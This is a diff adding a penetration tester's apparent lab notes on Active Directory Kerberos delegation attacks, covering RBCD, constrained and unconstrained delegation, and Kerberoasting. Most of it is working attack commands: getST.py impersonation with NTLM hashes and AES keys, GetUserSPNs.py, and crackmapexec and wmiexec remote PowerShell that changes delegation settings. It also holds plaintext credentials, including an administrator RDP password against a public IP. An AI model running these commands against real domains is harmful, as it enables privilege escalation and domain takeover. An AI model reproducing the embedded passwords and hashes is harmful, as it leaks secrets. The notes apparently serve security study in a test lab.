@@ -1,0 +1,187 @@
+xfreerdp /u:administrator /p:'l&M43x8?uqKbVbbC;6u;&2C)bn@RQXaW' /v:18.216.193.78
+
+getST.py sholuv.local/targetComputer$ -spn cifs/RBCDMachine.sholuv.local -impersonate sho_luv -hashes :cf833b7161c0da9bc7569b52fe0ddf01 -aesKey 82442d84a7bf551cb82d7b6476ae332378f1a3f94820ff12a4b9a6a7eef80a23
+getST.py sholuv.local/RBCDMachine$ -spn WSMAN/ComputerC.MyDomain.com -impersonate sho_luv -hashes :56e9f098ce6a1a7c14bf1abe0b9880fd
+/root/tools/CrackMapExec/build/lib/cme/thirdparty/pywerview/pywerview.py get-netuser -u sho_luv -p WindowsServer2019 -d sholuv.local --allow-delegation -t 192.168.1.222
+
+# idea for tool:
+# delegation_attack.py
+	# check:
+		# checks if account can create machine accounts (check value of ms-DS-MachineAccountQuota)
+		# checks if account 
+	# create computer account (DC must have ms-DS-MachineAccountQuota > 0 for account we control) -> i
+	# perform printer bug attack -> steal DC tgt  
+
+# kerberos over ssh issues:
+	# need to add DC hostname to /etc/hosts file
+	#	https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/
+
+# why?
+	# delegation exist because of the double hop problem. This problem is often suffered from SQL Server.
+	# Original solution was unconstrained delegation.
+	# solved with constrained delegation
+	# then resource based constrained delegation RBCD limiting it down to the service. 
+
+# conditions to exploit:
+	#) need account with msDS-AllowedToActOnBehalfOfOtherIdentity value set
+		# link: https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity
+		# check:
+		
+	#) DC needs to allow MachineAccountQuota
+		# check:
+			Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
+
+	#) create a computer account with msDS-AllowedToActOnBehalfOfOtherIdentity set
+			net computer \\computername /add 
+			Add-Computer -DomainName <domain.lan> -Credential <Account-user-domain>
+
+		# Set msDS-AllowedToActOnBehalfOfOtherIdentity with our new computer object
+			Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount RBCDMachine$
+			Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount 
+			Get-ADComputer -Identity targetComputer$ -Properties PrincipalsAllowedToDelegateToAccount
+
+		# call for ticket to DC as DA with access to either ldap (DCSync) or CIFS (access C$ drive) 
+
+
+# tools to read more about how they work:
+	https://github.com/FatRodzianko/Get-RBCD-Threaded # uses ldap to query entire forest
+	https://github.com/tothi/rbcd-attack	# changes resource to have rbcd
+	https://github.com/dirkjanm/krbrelayx 	# tools that do what I want to do in one
+
+# resources:
+	https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
+	https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#a-misunderstood-feature-1
+	https://www.youtube.com/watch?v=ayavtG7J_TQ&t
+	https://www.youtube.com/watch?v=rFi9Ufb6Yp0
+	http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
+	https://chryzsh.github.io/relaying-delegation/ # walks though current delegation attack chain	
+	t.ly/4iZn	# Kerberos Resource-based Constrained Delegation: Computer Object Take Over
+	https://www.youtube.com/watch?v=RUbADHcBLKg	# good explaination
+	t.ly/A2Ns 	# to review
+	t.ly/HzCd 	# to review
+
+# SPNs
+# Windows 2003 level or higher and create a Service Principal Name for the delegate user.
+
+# to manage SPNs from windows:
+	setspn.exe -s serviceclass/hostname:portnumber serviceAccountName
+	setspn.exe -s MSSQLSvc/MySqlServer:1433 mydomain\sqlservice
+	setspn -l hostname	# list SPNs
+	setspn -r 			# reset SPN
+	setspn -s 			# set SPN
+	setspn -d			# delete SPN
+
+	setspn -U -S CIFS/sho_luv sho_luv # add SPN for user sho_luv
+
+C:\>setspn -U -S CIFS/sho_luv sho_luv
+Checking domain DC=sholuv,DC=local
+
+Registering ServicePrincipalNames for CN=sho_luv,CN=Users,DC=sholuv,DC=local
+	CIFS/sho_luv
+Updated object
+
+
+	add-KdsRootkey	# create kds rook key... not sure what what or why.
+
+# attacks I have ready:
+
+	# kerberost attack:
+		setspn -U -S CIFS/Can_be_anything sho_luv	# set SPN to be cracked
+		GetUserSPNs.py sholuv.local/administrator:WindowsServer2019 -dc-ip 192.168.1.222	# get list of SPNs
+
+	# delegation attacks:
+		# opsec check for setspn.exe
+		# opsec kerberost honey pot lookes for event 4769 on non-null SPN 
+		findDelegation.py sholuv.local/administrator:WindowsServer2019 -dc-ip 192.168.1.222	# check for delegations
+
+		# set ComputerB to be unconstrained delegation
+		powershell Get-ADComputer -Identity ComputerB | Set-ADAccountControl ‑TrustedToAuthForDelegation $true
+		powershell import-module activedirectory; Set-ADAccountControl -Identity <hostname$>  -TrustedForDelegation $true
+
+		# set ComputerB to be constrained delegation
+		Set-ADComputer -Identity ComputerB -Add @{'msDS-AllowedToDelegateTo'=@('HOST/ComputerC','WSMAN/ComputerC.MyDomain.com')}
+
+
+		# powershell to set and remove delegation
+		# https://docs.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountcontrol?view=windowsserver2019-ps
+
+		# search for service account with delegation rights
+		# wrong: powershell import-module activedirectory; Get-ADServiceAccount dostuff -Properties PrincipalsAllowedToDelegateToAccount
+		# wrong: powershell import-module activedirectory; New-ServiceAccount -samaccountname $dostuff -description $dustuff
+
+		###
+		#	The “DS-Replication-Get-Changes” extended right
+		#	CN: DS-Replication-Get-Changes
+		#	GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+		#	The “Replicating Directory Changes All” extended right
+		#	CN: DS-Replication-Get-Changes-All
+		#	GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+		#	The “Replicating Directory Changes In Filtered Set” extended right (this one isn’t always needed but we can add it just in case :)
+		#	CN: DS-Replication-Get-Changes-In-Filtered-Set
+		#	GUID: 89e95b76-444d-4c62-991a-0facbeda640c
+		# 	https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/impacket/examples/ntlmrelayx/attacks/ldapattack.py
+		#   secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', usersid))
+
+
+		#######################################
+		## unconstrained delegation:
+		##
+		## 		Trust this user for delegation to any service. pre 2003 server
+
+		##
+		#######################################
+
+			# manually
+				wmiexec.py sho_luv:Rapid7isc00l@192.168.1.171
+				powershell import-module activedirectory; Set-ADAccountControl -Identity WINDOWS10$  -TrustedForDelegation $true
+				powershell import-module activedirectory; Set-ADAccountControl -Identity <hostname$>  -TrustedForDelegation $true
+				powershell import-module activedirectory; Set-ADAccountControl -Identity talia  -TrustedForDelegation $true		# set user to unconstrained
+				powershell import-module activedirectory; Get-ADComputer -Identity <hostname$> | Set-ADAccountControl ‑TrustedForDelegation $true
+
+			# cme powershell set unconstrained
+				crackmapexec smb 192.168.1.171 -u sho_luv -p Rapid7isc00l -X 'import-module activedirectory; Set-ADAccountControl -Identity WINDOWS10$ -TrustedForDelegation $true' 	# enable unconstrained delegation
+				crackmapexec smb 192.168.1.171 -u sho_luv -p Rapid7isc00l -X 'import-module activedirectory; Set-ADAccountControl -Identity WINDOWS10$ -TrustedForDelegation $false' 	# disable unconstrained delegation
+				crackmapexec smb 192.168.1.171 -u sho_luv -p rapid7isc00l -X 'import-module activedirectory; Get-ADComputer -Identity WINDOWS10 | Set-ADAccountControl ‑TrustedForDelegation $true' # enable unconstrained delegation
+				crackmapexec smb 192.168.1.171 -u sho_luv -p rapid7isc00l -X 'import-module activedirectory; Get-ADComputer -Identity WINDOWS10 | Set-ADAccountControl ‑TrustedForDelegation $false' # disable unconstrained delegation
+
+		#######################################
+		## set resource based constrained delegation (RBCD):
+		##
+		## Trust this object for delegation to specified services only
+		##
+		#######################################
+
+			# manually
+				wmiexec.py sho_luv:Rapid7isc00l@192.168.1.171
+				# list SPNs for system
+					powershell import-module activedirectory; "Get-ADComputer WINDOWS10$ -Properties ServicePrincipalNames |Select-Object -ExpandProperty ServicePrincipalNames"
+					crackmapexec smb 192.168.1.171 -u sho_luv -H 30b69aa82acd57e100de765a40e9c755:30b69aa82acd57e100de765a40e9c755 -X 'import-module activedirectory; Get-ADComputer WINDOWS10$ -Properties ServicePrincipalNames |Select-Object -ExpandProperty ServicePrincipalNames'
+
+				# add constrained delegation
+					# add computer to domain:
+					net computer \\computername /add 	# run on DC
+					netdom join computername /domain:domainname 	# run on computer to join
+					# add delegation to computer
+					powershell import-module activedirectory; Set-ADComputer -Identity WINDOWS10$ -Add @{'msDS-AllowedToDelegateTo'=@('HOST/WINXP$','WSMAN/WINXP.hackme.local')}
+					powershell import-module activedirectory; Set-ADComputer -Identity WINDOWS10$ -Add @{'msDS-AllowedToDelegateTo'=@('HOST/WINXP$')}
+					# add user
+					powershell import-module activedirectory; Set-ADUser -Identity talia -Add @{'msDS-AllowedToDelegateTo'=@('HOST/windows10$')}
+
+				# remove constrained delegation
+					powershell import-module activedirectory; Set-ADComputer -Identity WINDOWS10$ -Remove @{'msDS-AllowedToDelegateTo'=@('HOST/WINXP$','WSMAN/WINXP.hackme.local')}
+
+
+					Get-ADComputer -Identity <computer$> | Set-ADAccountControl ‑TrustedToAuthForDelegation $true
+					Set-ADComputer -Identity <computer$> -Add @{'msDS-AllowedToDelegateTo'=@('HOST/ComputerC','WSMAN/ComputerC.MyDomain.com')}
+
+					powershell import-module activedirectory; Get-ADComputer WINDOWS10$ -Properties servicePrincipalName | Select-Object ‑ExpandProperty servicePrincipalName	
+
+		# set resource constrained delegation:
+			# manually
+
+				Set-ADComputer WINDOWS10$ -PrincipalsAllowedToDelegateToAccount (Get-ADComputer WINXP$)	
+		
+			# scripts:
+				https://github.com/tothi/rbcd-attack	
+				https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff#file-rbcd_demo-ps1
+
